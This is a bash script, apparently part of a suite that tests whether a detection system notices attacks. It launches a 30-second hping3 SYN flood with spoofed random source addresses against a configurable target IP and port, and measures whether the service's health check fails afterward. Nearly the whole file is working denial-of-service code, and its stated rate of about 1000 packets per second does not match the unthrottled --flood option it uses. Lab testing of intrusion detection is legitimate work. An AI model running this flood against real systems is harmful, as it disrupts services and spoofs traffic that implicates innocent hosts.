#!/usr/bin/env bash
# =============================================================================
# 05 — DoS: SYN Flood
# Tool: hping3
# SSS should detect: DoS/DDoS via SYN ratio spike and packet rate anomaly
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "05_dos_syn_flood"

VULN_PORT="${VULN_APP_PORT:-8888}"
DURATION=30  # seconds of flooding
FLOOD_RATE=1000  # packets per second (--faster or -i u1000)

echo "[*] Checking target availability before attack..."
pre_check=$(curl -sf -o /dev/null -w "%{http_code}" \
    --max-time 5 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || pre_check="000"
echo "  Pre-attack HTTP status: ${pre_check}"

echo "[*] Launching SYN flood against ${TARGET_IP}:${VULN_PORT} for ${DURATION}s..."
echo "  Rate: ~${FLOOD_RATE} SYN packets/second"

# Run hping3 in background, capture PID
hping3 -S --flood \
    -p "${VULN_PORT}" \
    --rand-source \
    "${TARGET_IP}" \
    >/tmp/hping3_output.txt 2>&1 &
HPING_PID=$!

# Let it run for the specified duration
sleep "${DURATION}"

# Stop the flood
kill "${HPING_PID}" 2>/dev/null || true
wait "${HPING_PID}" 2>/dev/null || true

hping_output=$(cat /tmp/hping3_output.txt 2>/dev/null || echo "no output captured")

# Check if target is still responsive after the flood
echo "[*] Checking target availability after attack..."
sleep 2
post_check=$(curl -sf -o /dev/null -w "%{http_code}" \
    --max-time 10 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || post_check="000"
echo "  Post-attack HTTP status: ${post_check}"

if [[ "${pre_check}" != "000" && "${post_check}" == "000" ]]; then
    evidence="SYN flood caused service disruption. Pre: HTTP ${pre_check}, Post: HTTP ${post_check} (unreachable)."
    record_result "true" "${evidence}" "${hping_output}"
elif [[ "${pre_check}" == "000" ]]; then
    evidence="Target was already unreachable before attack (port ${VULN_PORT})."
    record_result "false" "${evidence}" "${hping_output}"
else
    # Service survived — check if response time degraded
    response_time=$(curl -sf -o /dev/null -w "%{time_total}" \
        --max-time 10 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || response_time="timeout"
    if [[ "${response_time}" == "timeout" ]]; then
        evidence="SYN flood caused significant latency (timeout on health check)."
        record_result "true" "${evidence}" "${hping_output}"
    else
        evidence="SYN flood ran for ${DURATION}s. Service remained responsive (${response_time}s response). Attack may have been mitigated."
        record_result "false" "${evidence}" "${hping_output}"
    fi
fi

rm -f /tmp/hping3_output.txt
